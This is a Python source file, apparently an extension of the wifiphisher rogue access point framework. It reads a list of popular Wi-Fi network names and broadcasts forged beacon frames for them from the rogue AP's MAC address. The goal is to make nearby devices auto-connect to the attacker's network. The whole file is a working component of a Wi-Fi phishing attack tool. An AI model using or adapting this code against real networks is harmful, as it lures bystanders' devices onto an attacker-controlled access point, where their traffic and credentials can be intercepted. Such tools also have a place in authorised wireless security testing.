"""
Extension that sends a number of known beacons to trigger the AUTO-CONNECT flag.
"""

import logging
from collections import defaultdict
import wifiphisher.common.constants as constants
import scapy.layers.dot11 as dot11

logger = logging.getLogger(__name__)


class Knownbeacons(object):
    """
    Sends a number of known beacons to trigger the AUTO-CONNECT flag.
    """

    def __init__(self, shared_data):
        """
        Setup the class with all the given arguments

        :param self: A Beacons object
        :param data: Shared data from main engine
        :type self: Beacons
        :type data: dict
        :return: None
        :rtype: None
        """

        self.first_run = True
        self.data = shared_data
        # store channel to frame list
        self._packets_to_send = defaultdict(list)

    def get_packet(self, pkt):
        """
        We start broadcasting the beacons on the first received packet

        :param self: A Knownbeacons object
        :param packet: A scapy.layers.RadioTap object
        :type self: Knownbeacons
        :type packet: scapy.layers.RadioTap
        :return: A tuple containing ["*"] followed by a list of
            the crafted beacon frames
        :rtype: tuple(list, list)
        .. warning: pkt is not used here but should not be removed since
            this prototype is requirement
        """

        beacons = list()
        essid = str()
        bssid = self.data.rogue_ap_mac

        # initiliate the _packets_to_send in first run
        if self.first_run:
            self._packets_to_send["*"] = beacons

        # only run this code once
        if self.first_run and self.data.args.known_beacons:
            # locate the lure10 file
            area_file = constants.POPULAR_WLANS_FILE

            with open(area_file) as _file:
                for line in _file:
                    # remove any white space and store the ESSID (first word)
                    line.strip()
                    if line.startswith("#"):
                        continue
                    essid = line.split(" ", 1)[0]

                    # craft the required packet parts
                    frame_part_0 = dot11.RadioTap()
                    frame_part_1 = dot11.Dot11(
                        subtype=8,
                        addr1=constants.WIFI_BROADCAST,
                        addr2=bssid,
                        addr3=bssid)
                    frame_part_2 = dot11.Dot11Beacon(cap=0x2105)
                    frame_part_3 = dot11.Dot11Elt(ID="SSID", info=essid)
                    frame_part_4 = dot11.Dot11Elt(
                        ID="Rates", info=constants.AP_RATES)
                    frame_part_5 = dot11.Dot11Elt(ID="DSset", info=chr(7))

                    # create a complete packet by combining the parts
                    complete_frame = (
                        frame_part_0 / frame_part_1 / frame_part_2 /
                        frame_part_3 / frame_part_4 / frame_part_5)
                    # add the frame to the list
                    beacons.append(complete_frame)

                    # make sure this block is never executed again and the notification occurs
                    self.first_run = False
            self._packets_to_send["*"] = beacons
        return self._packets_to_send

    def send_output(self):
        """
        Sending Knownbeacons notification

        :param self: A Knownbeacons object
        :type self: Knownbeacons
        :return: list of notification messages
        :rtype: list
        .. note: Only sends notification for the first time to reduce
            clutters
        """

        return (not self.first_run and self.data.args.known_beacons
                and ["Sending known beacons..."] or [])

    def send_channels(self):
        """
        Send all interested channels

        :param self: A Knownbeacons object
        :type self: Knownbeacons
        :return: A list with all the channels interested
        :rtype: list
        .. note: Only the channel of the target AP is sent here
        """

        return [self.data.target_ap_channel]
